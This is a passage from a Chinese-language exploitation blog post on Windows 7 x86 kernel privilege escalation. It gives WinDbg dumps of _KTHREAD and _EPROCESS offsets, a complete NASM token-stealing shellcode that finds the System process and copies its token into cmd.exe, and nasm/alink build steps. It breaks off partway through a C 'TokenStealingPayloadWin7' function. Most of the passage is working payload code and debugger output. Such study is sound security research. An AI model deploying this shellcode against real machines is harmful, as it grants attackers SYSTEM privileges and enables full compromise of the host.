</tr>
</thead>
<tbody><tr>
<td>cmd.exe（获得更高的特权）</td>
<td>shellcode.exe</td>
</tr>
</tbody></table>
<p>当前EPROCESS的InheritedFromUniqueProcessId是父进程ID， InheritedFromUniqueProcessId用来接收父进程ID</p>
<p>FS:0x120 →→ _KPCR<br>_KPCR:0x004 →→ _KTHREAD(CurrentThread)<br>_KTHREAD:0x150 →→ _KPROCESS<br>_KPROCESS:0x140 →→ InheritedFromUniqueProcessId</p>
<p>InheritedFromUniqueProcessId相对于当前进程的偏移量为0x140。<br>实际上是父进程的PID（例如：cmd.exe)，可以通过以下方式捕获：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; dt _EPROCESS <span class="hljs-number">87948d40</span> InheritedFromUniqueProcessId<br>ntdll!_EPROCESS<br>   +<span class="hljs-number">0</span>x140 InheritedFromUniqueProcessId : <span class="hljs-number">0</span>x<span class="hljs-number">000005a4</span> Void<br>kd&gt; ? <span class="hljs-number">0</span>x<span class="hljs-number">000005a4</span><br>Evaluate expression: <span class="hljs-number">1444</span> = <span class="hljs-number">000005a4</span> <span class="hljs-comment">; Parent Process ID</span><br><br></code></pre></td></tr></table></figure>

<p>在汇编代码中，父进程的进程ID可以通过以下指令找到：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span> + <span class="hljs-number">140h</span>]<br></code></pre></td></tr></table></figure>



<h5 id="从父进程读取ACCESS-TOKEN"><a href="#从父进程读取ACCESS-TOKEN" class="headerlink" title="从父进程读取ACCESS TOKEN"></a>从父进程读取ACCESS TOKEN</h5><p>问题：如何定位父进程(cmd.exe)的EPROCESS ?</p>
<p>_KPROCESS:0xb4 →→ UniqueProcessId<br>_KPROCESS:0xb8 →→ ActiveProcessLinks<br>_KPROCESS:0x140 →→ InheritedFromUniqueProcessId</p>
<p>使用成员ActiveProcessLinks，我们可以使用dt命令转储内核中所有活动进程的列表。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dt</span> nt!_EPROCESS -l ActiveProcessLinks.Flink <span class="hljs-number">87948</span>d<span class="hljs-number">40</span><br><span class="hljs-attribute">dt</span> nt!_EPROCESS -l ActiveProcessLinks.Flink <span class="hljs-number">87948</span>d<span class="hljs-number">40</span> UniqueProcessId ; dump<br><span class="hljs-attribute">all</span> Process ID<br><span class="hljs-attribute">dt</span> nt!_EPROCESS -l ActiveProcessLinks.Flink <span class="hljs-number">87948</span>d<span class="hljs-number">40</span> ImageFileName ; dump<br><span class="hljs-attribute">all</span> Process Name<br></code></pre></td></tr></table></figure>

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sqf">kd&gt; dt <span class="hljs-variable">_EPROCESS</span> <span class="hljs-number">87948</span>d40<br>ntdll!<span class="hljs-variable">_EPROCESS</span><br>   +<span class="hljs-number">0</span>x000 Pcb              : <span class="hljs-variable">_KPROCESS</span><br>   +<span class="hljs-number">0</span>x098 ProcessLock      : <span class="hljs-variable">_EX_PUSH_LOCK</span><br>   +<span class="hljs-number">0</span>x0a0 CreateTime       : <span class="hljs-variable">_LARGE_INTEGER</span> <span class="hljs-number">0</span>x01d6cf97`fca14aa0<br>   +<span class="hljs-number">0</span>x0a8 ExitTime         : <span class="hljs-variable">_LARGE_INTEGER</span> <span class="hljs-number">0</span>x0<br>   +<span class="hljs-number">0</span>x0b0 RundownProtect   : <span class="hljs-variable">_EX_RUNDOWN_REF</span><br>   +<span class="hljs-number">0</span>x0b4 UniqueProcessId  : <span class="hljs-number">0</span>x00000bc8 Void<br>   +<span class="hljs-number">0</span>x0b8 ActiveProcessLinks : <span class="hljs-variable">_LIST_ENTRY</span> [ <span class="hljs-number">0</span>x87936da0 - <span class="hljs-number">0</span>x879a8df8 ]<br></code></pre></td></tr></table></figure>



<p>在EPROCESS的偏移0xb4处，存放着进程的PID,在偏移0xb8处，存放着_LIST_ENTRY链表，这个链表放着所有的EPROCESS，然后可以遍历它们，查找名为cmd.exe的父进程的PID：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">loop1:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b8h</span>]<br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">b8h</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b4h</span>], <span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">jne</span> loop1<br></code></pre></td></tr></table></figure>



<p>access token是描述进程或线程的安全上下文的对象。 令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。 完成此操作后，我们要查找令牌的地址，因为这是我们要替换的地址。 它位于偏移量0xf8处，如下所示：</p>
<p>_KPROCESS:0xb4 →→ UniqueProcessId<br>_KPROCESS:0xb8 →→ ActiveProcessLinks<br>_KPROCESS:0x140 →→ InheritedFromUniqueProcessId<br>_KPROCESS:0xf8 →→ Token</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">kd&gt; dt <span class="hljs-variable">_EPROCESS</span> <span class="hljs-number">878784</span>d0 Token<br>ntdll!<span class="hljs-variable">_EPROCESS</span><br>   +<span class="hljs-number">0</span>x0f8 Token : <span class="hljs-variable">_EX_FAST_REF</span><br></code></pre></td></tr></table></figure>

<p>因此，在继续之前，我们一定要存储该地址：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">f8h</span><br></code></pre></td></tr></table></figure>



<h5 id="从特权进程读取ACCESS-TOKEN"><a href="#从特权进程读取ACCESS-TOKEN" class="headerlink" title="从特权进程读取ACCESS TOKEN"></a>从特权进程读取ACCESS TOKEN</h5><p>为了获得SYSTEM特权，我们需要找到System进程的EPROCESS。 由于System的PID始终为4，因此我们可以通过以下方式找到它：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">loop2:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b8h</span>]<br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">b8h</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">b4h</span>], <span class="hljs-number">4</span><br><span class="hljs-keyword">jne</span> loop2<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">f8h</span><br></code></pre></td></tr></table></figure>

<p>这给了我们System进程的EPROCESS地址。</p>
<p>_KPROCESS:0xf8→→ Token</p>
<h5 id="替换非特权进程的访问令牌"><a href="#替换非特权进程的访问令牌" class="headerlink" title="替换非特权进程的访问令牌"></a>替换非特权进程的访问令牌</h5><p>下一步是替换cmd.exe进程的令牌。 只需通过覆盖现有令牌即可完成：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">edx</span>], <span class="hljs-built_in">eax</span><br></code></pre></td></tr></table></figure>

<p>EAX contains offset 0xF8 of the  EPROCESS address of the  System Process .<br> EDX contains offset 0xF8 of the  EPROCESS address of  cmd.exe .</p>
<h5 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h5><p>汇编代码如下</p>
<p>用的是nasm+alink</p>
<p>nasm和alink可以在这里下载：<a target="_blank" rel="noopener" href="http://www.nasm.us/"><code>nasm</code></a>，<a target="_blank" rel="noopener" href="http://alink.sourceforge.net/download.html"><code>alink</code></a>。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">BITS</span> <span class="hljs-number">32</span><br><span class="hljs-meta">section</span> .text<br><span class="hljs-comment">;当前进程的EPROCESS</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span>  <span class="hljs-built_in">fs</span>:[<span class="hljs-number">0x124</span>] <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">eax</span> + <span class="hljs-number">0x150</span>]  <span class="hljs-comment">;获取_KPROCESS</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">eax</span> + <span class="hljs-number">0x140</span>] <span class="hljs-comment">;获取父进程的PID</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;获取_KPROCESS</span><br><span class="hljs-symbol">loop1:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb8</span>] <span class="hljs-comment">;获取_LIST_ENTRY</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0xb8</span>  <span class="hljs-comment">; 获取_KPROCESS</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb4</span>], <span class="hljs-built_in">ebx</span>  <span class="hljs-comment">;进程的PID和父进程的PID比较</span><br><span class="hljs-keyword">jne</span> loop1  <span class="hljs-comment">;相等退出循环</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ecx</span>  <span class="hljs-comment">;获取_KPROCESS</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0xf8</span>  <span class="hljs-comment">;获取_KPROCESS偏移0xf8处的Token，这里是父进程（cmd.exe）的token</span><br><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span> <span class="hljs-comment">;清空</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;获取_KPROCESS</span><br><span class="hljs-symbol">loop2:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb8</span>]  <span class="hljs-comment">;获取_LIST_ENTRY</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0xb8</span>  <span class="hljs-comment">; 获取_KPROCESS</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0xb4</span>], <span class="hljs-number">4</span>  <span class="hljs-comment">;进程的PID和System的PID比较</span><br><span class="hljs-keyword">jne</span> loop2  <span class="hljs-comment">;相等退出循环</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ecx</span>  <span class="hljs-comment">; 获取_KPROCESS</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0xf8</span>  <span class="hljs-comment">;获取_KPROCESS偏移0xf8处的Token，这块的就是system的token</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">eax</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span>  [<span class="hljs-built_in">edx</span>], <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;用system的token替换cmd.exe进程的token</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>

<p>编译链接</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stata">F:\nasm&gt;nasm -fwin32 <span class="hljs-keyword">shell</span>.asm<br><br>F:\nasm&gt; alink -oPE <span class="hljs-keyword">shell</span>.obj<br>ALINK v1.6 (C) <span class="hljs-keyword">Copyright</span> 1998-9 Anthony A.J. Williams.<br>All Rights Reserved<br><br>Loading <span class="hljs-keyword">file</span> <span class="hljs-keyword">shell</span>.obj<br>matched Externs<br>matched ComDefs<br>Generating PE <span class="hljs-keyword">file</span> <span class="hljs-keyword">shell</span>.exe<br>Warning, <span class="hljs-keyword">no</span> entry point specified<br><br>F:\nasm&gt;<span class="hljs-keyword">shell</span><br><br>F:\nasm&gt;<br></code></pre></td></tr></table></figure>



<p>这个例子提权没成功，程序崩溃，也没找到原因，还是先回到题目吧</p>
<h5 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h5><p>首先会通过fs段寄存器获取_KTHREAD结构体，fs段寄存器存放了关于线程的各种信息，当处于内核态时，fs的值为0x30，处于用户态时fs值则为0x3b</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; r fs<br>fs=<span class="hljs-number">00000030</span><br>kd&gt; dd fs:[<span class="hljs-number">124</span>]<br><span class="hljs-number">0030</span>:<span class="hljs-number">00000124</span>  <span class="hljs-number">83f6f380</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f6f380</span> <span class="hljs-number">00000100</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000134</span>  <span class="hljs-number">60010115</span> <span class="hljs-number">0001003</span>f <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000144</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> ffff0ff<span class="hljs-number">0 00000400</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000154</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000164</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000174</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83</span>efeae<span class="hljs-number">7 83e41f64</span><br><span class="hljs-number">0030</span>:<span class="hljs-number">00000184</span>  <span class="hljs-number">00000002</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f62658</span> <span class="hljs-number">83</span>e41e8d<br><span class="hljs-number">0030</span>:<span class="hljs-number">00000194</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000080</span> <span class="hljs-number">83</span>e41f10<br>kd&gt; dt _KTHREAD <span class="hljs-number">83f6f380</span><br>ntdll!_KTHREAD<br>   +<span class="hljs-number">0</span>x000 Header           : _DISPATCHER_HEADER<br>   +<span class="hljs-number">0</span>x010 CycleTime        : <span class="hljs-number">0</span>x0000008e`<span class="hljs-number">2d</span>27fbf3<br>  ...<br>   +<span class="hljs-number">0</span>x03c Reserved         : <span class="hljs-number">0</span>y0000000<span class="hljs-number">00000000000</span> (<span class="hljs-number">0</span>)<br>   +<span class="hljs-number">0</span>x03c MiscFlags        : <span class="hljs-number">0</span>n8193<br>   +<span class="hljs-number">0</span>x040 ApcState         : _KAPC_STATE<br>   +<span class="hljs-number">0</span>x040 ApcStateFill     : [<span class="hljs-number">23</span>]  &quot;???&quot;<br>   +<span class="hljs-number">0</span>x057 Priority         : <span class="hljs-number">0</span> &#x27;&#x27;<br> ...<br> kd&gt; dt _KAPC_STATE<br>ntdll!_KAPC_STATE<br>   +<span class="hljs-number">0</span>x000 ApcListHead      : [<span class="hljs-number">2</span>] _LIST_ENTRY<br>   +<span class="hljs-number">0</span>x010 Process          : Ptr32 _KPROCESS<br>   +<span class="hljs-number">0</span>x014 KernelApcInProgress : UChar<br>   +<span class="hljs-number">0</span>x015 KernelApcPending : UChar<br>   +<span class="hljs-number">0</span>x016 UserApcPending   : UChar<br></code></pre></td></tr></table></figure>

<p>KTHREAD结构的偏移0x50处为KPROCESS结构，而KPROCESS为EPROCESS结构的第一个字段，即定位到了_EPROCESS结构。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; dd <span class="hljs-number">83f6f380</span>+<span class="hljs-number">50</span><br>ReadVirtual: <span class="hljs-number">83f6f3d0</span> not properly sign extended<br><span class="hljs-number">83f6f3d0</span>  <span class="hljs-number">859f8a20</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f3e0</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">000064e0</span> <span class="hljs-number">00020002</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f3f0</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f400</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f410</span>  <span class="hljs-number">00000008</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f6f488</span> <span class="hljs-number">83f6f488</span><br><span class="hljs-number">83f6f420</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">83f6f430</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000060</span> <span class="hljs-number">83</span>fa49c0<br><span class="hljs-number">83f6f440</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">83f6f380</span> <span class="hljs-number">00000000</span><br>kd&gt; dt _EPROCESS <span class="hljs-number">859f8a20</span><br>ntdll!_EPROCESS<br>   +<span class="hljs-number">0</span>x000 Pcb              : _KPROCESS<br>   +<span class="hljs-number">0</span>x098 ProcessLock      : _EX_PUSH_LOCK<br>   +<span class="hljs-number">0</span>x0a0 CreateTime       : _LARGE_INTEGER <span class="hljs-number">0</span>x01d6cfbb`f72e7f4c<br>   +<span class="hljs-number">0</span>x0a8 ExitTime         : _LARGE_INTEGER <span class="hljs-number">0</span>x0<br>   +<span class="hljs-number">0</span>x0b0 RundownProtect   : _EX_RUNDOWN_REF<br>   +<span class="hljs-number">0</span>x0b4 UniqueProcessId  : <span class="hljs-number">0x00000004</span> Void<br>   +<span class="hljs-number">0</span>x0b8 ActiveProcessLinks : _LIST_ENTRY [ <span class="hljs-number">0</span>x86df60d8 - <span class="hljs-number">0</span>x83f7cf18 ]<br>   +<span class="hljs-number">0</span>x0c0 ProcessQuotaUsage : [<span class="hljs-number">2</span>] <span class="hljs-number">0</span><br>   +<span class="hljs-number">0</span>x0c8 ProcessQuotaPeak : [<span class="hljs-number">2</span>] <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>一旦获取了<em>EPROCESS结构，我们能做很多事情，最简单的，观察偏移0xb4位置，存放着当前进程的PID，而0xb8位置，存放着一个</em>LIST_ENTRY结构，这个结构存放着前面一个<em>EPROCESS和后一个</em>EPROCESS，这就很有意思了。</p>
<p>我可以通过这种方法，遍历当前系统所有存在的<em>EPROCESS，而且能够找到System的</em>EPROCESS，实际上，这个_EPROCESS，我们通过Windbg的!process 0 0的方法可以获取到。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dns">kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> system<br>PROCESS <span class="hljs-number">859f8a20</span>  SessionId: none  Cid: <span class="hljs-number">0004</span>    Peb: <span class="hljs-number">00000000</span>  ParentCid: <span class="hljs-number">0000</span><br>    DirBase: <span class="hljs-number">00185000</span>  ObjectTable: <span class="hljs-number">89001b60</span>  HandleCount: <span class="hljs-number">495</span>.<br>    Image: System<br><br>kd&gt; dt _LIST_ENTRY <span class="hljs-number">859f8a20</span>+b8<br>ntdll!_LIST_ENTRY<br> [ <span class="hljs-number">0</span>x86df60d8 - <span class="hljs-number">0</span>x83f7cf18 ]<br>   +<span class="hljs-number">0</span>x000 Flink            : <span class="hljs-number">0</span>x86df60d8 _LIST_ENTRY [ <span class="hljs-number">0</span>x873fe0e8 - <span class="hljs-number">0</span>x859f8ad8 ]<br>   +<span class="hljs-number">0</span>x004 Blink            : <span class="hljs-number">0</span>x83f7cf18 _LIST_ENTRY [ <span class="hljs-number">0</span>x859f8ad8 - <span class="hljs-number">0</span>x879dd320 ]<br>kd&gt; dd <span class="hljs-number">859f8a20</span>+b8<br>ReadVirtual: <span class="hljs-number">859</span>f8ad8 not properly sign extended<br><span class="hljs-number">859</span>f8ad8  <span class="hljs-number">86d</span>f60d8 <span class="hljs-number">83</span>f7cf<span class="hljs-number">18 00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859</span>f8ae8  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">0000000</span>b <span class="hljs-number">83</span>f70cc0<br><span class="hljs-number">859</span>f8af8  <span class="hljs-number">00000000</span> <span class="hljs-number">007c7000</span> <span class="hljs-number">00250000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859f8b08</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">89001b60</span><br><span class="hljs-number">859f8b18</span>  <span class="hljs-number">890012c4</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859f8b28</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">85</span>a03e<span class="hljs-number">00 00000000</span><br><span class="hljs-number">859f8b38</span>  <span class="hljs-number">00000004</span> <span class="hljs-number">00000040</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">859f8b48</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span><br>kd&gt; dt _EPROCESS <span class="hljs-number">86d</span>f60d8-b8  ；这就是system的_EPROCESS<br>ntdll!_EPROCESS<br>   +<span class="hljs-number">0</span>x000 Pcb              : _KPROCESS<br>   +<span class="hljs-number">0</span>x098 ProcessLock      : _EX_PUSH_LOCK<br>   +<span class="hljs-number">0</span>x0a0 CreateTime       : _LARGE_INTEGER <span class="hljs-number">0</span>x01d6cfbb`f73f28ee<br>   +<span class="hljs-number">0</span>x0a8 ExitTime         : _LARGE_INTEGER <span class="hljs-number">0</span>x0<br>   +<span class="hljs-number">0</span>x0b0 RundownProtect   : _EX_RUNDOWN_REF<br>   +<span class="hljs-number">0</span>x0b4 UniqueProcessId  : <span class="hljs-number">0x00000100</span> Void<br>   +<span class="hljs-number">0</span>x0b8 ActiveProcessLinks : _LIST_ENTRY [ <span class="hljs-number">0</span>x873fe0e8 - <span class="hljs-number">0</span>x859f8ad8 ]<br>   +<span class="hljs-number">0</span>x0c0 ProcessQuotaUsage : [<span class="hljs-number">2</span>] <span class="hljs-number">0</span>x2f8<br></code></pre></td></tr></table></figure>

<p>回到shellcode，后面有一个loop循环，在循环中做的事情就是不断通过链表的前向指针和后向指针找到System的_EPROCESS结构，也就是＋0xb4位置的PID为4的结构，在结构中存放着token，只要找到System的token，替换掉当前进程的token，就可以完成提权了。</p>
<p>payload</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">VOID <span class="hljs-title">TokenStealingPayloadWin7</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// Importance of Kernel Recovery</span><br>    __asm &#123;<br>        pushad                               